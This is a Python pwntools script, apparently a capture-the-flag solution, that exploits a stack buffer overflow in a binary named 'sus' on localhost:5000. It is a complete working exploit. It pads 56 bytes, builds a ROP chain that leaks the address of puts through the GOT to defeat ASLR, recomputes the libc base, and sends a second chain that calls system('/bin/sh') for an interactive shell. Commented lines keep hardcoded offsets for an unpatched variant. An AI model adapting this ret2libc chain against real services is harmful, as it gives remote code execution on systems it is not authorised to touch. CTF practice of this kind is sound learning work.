#!/usr/bin/env python3

from pwn import *

exe = ELF("./sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
    else:
        r = remote("localhost", 5000)

    return r


def main():
    r = conn()

    rop = ROP(exe, badchars=b'\n')
    ret = rop.find_gadget(["ret"])[0]

    r.sendlineafter(b'sus?\n', b''.join([
        b'A'*56,
        p64(exe.got.puts),  # Gets inserted into rdi
        b'A'*8,
        p64(exe.plt.puts),  # Call puts to dump GOT entry of puts
        p64(exe.symbols._start)  # Reopen attack vector
    ]))
    
    # UNPATCHED
    # libc.address = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x80e50
    
    libc.address = u64(r.recvline().strip().ljust(8,b'\x00')) - libc.symbols.puts
    log.info(f"{hex(libc.address)=}")

    # UNPATCHED
    # r.sendlineafter(b'sus?\n', b'A'*56 + p64(libc.address + 0x1d8678) + b'A'*8 + p64(ret) + p64(libc.address + 0x50d70))

    r.sendlineafter(b'sus?\n', b''.join([
        b'A'*56,
        p64(next(libc.search(b'/bin/sh'))),  # Gets inserted into rdi
        b'A'*8,
        p64(ret),  # For stack alignment to 16-byte boundary
        p64(libc.symbols.system)  # Call to system()
    ]))

    r.interactive()

if __name__ == "__main__":
    main()